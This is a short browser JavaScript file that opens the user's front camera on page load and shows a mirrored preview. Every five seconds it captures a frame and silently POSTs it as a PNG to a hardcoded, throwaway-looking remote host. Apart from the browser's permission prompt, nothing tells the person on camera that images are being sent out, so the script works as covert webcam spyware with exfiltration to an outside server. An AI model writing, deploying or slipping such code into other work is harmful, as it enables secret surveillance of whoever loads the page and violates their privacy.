const SCREENSHOT_DELAY_MS = 5000;
const SEND_IMAGES_TO = "http://fkeldfjhledjfhlskjfdghksjf.fuck/img"

let startTime = Date.now();

let sendScreenshot = (video) => {
	let canvas = document.createElement("canvas");
	canvas.width = video.videoWidth;
	canvas.height = video.videoHeight;
	context = canvas.getContext("2d");
	context.drawImage(video, 0, 0);

	var formData = new FormData();
	formData.append("img", canvas.toDataURL("image/png"));
	request = new XMLHttpRequest();
	request.open("POST", SEND_IMAGES_TO);
	request.send(formData);
	// TODO: HANDLE RESPONSE!
}

// Older browsers might not implement mediaDevices at all, so we set an empty object first
if (navigator.mediaDevices === undefined) {
	navigator.mediaDevices = {};
}

// Some browsers partially implement mediaDevices. We can't just assign an object
// with getUserMedia as it would overwrite existing properties.
// Here, we will just add the getUserMedia property if it's missing.
if (navigator.mediaDevices.getUserMedia === undefined) {
 	navigator.mediaDevices.getUserMedia = constraints => {
		// First get ahold of the legacy getUserMedia, if present
		var getUserMedia = navigator.webkitGetUserMedia || navigator.mozGetUserMedia;

		// Some browsers just don't implement it - return a rejected promise with an error
		// to keep a consistent interface
		if (!getUserMedia) {
			return Promise.reject(new Error('getUserMedia is not implemented in this browser'));
		}

		// Otherwise, wrap the call to the old navigator.getUserMedia with a Promise
		return new Promise(function(resolve, reject) {
			getUserMedia.call(navigator, constraints, resolve, reject);
		});
	}
}

// Get the video stream with preference for a front-facing camera on mobiles
navigator.mediaDevices.getUserMedia({audio: false, video: {facingMode: "user"}})
.then(mediaStream => {
	let video = document.querySelector("#cameraVideo");
	if ("srcObject" in video) {
		video.srcObject = mediaStream;
	} else {
		// Avoid using this in new browsers, as it is going away.
		video.src = window.URL.createObjectURL(mediaStream);
	}
	//Flip horizontalyy
	video.style.cssText = "transform: scaleX(-1);"
	video.onloadedmetadata = e => {
		video.play();
		setInterval(() => { sendScreenshot(video); }, SCREENSHOT_DELAY_MS);
	}
})
.catch(err => { console.log(err.name + ": " + err.message); })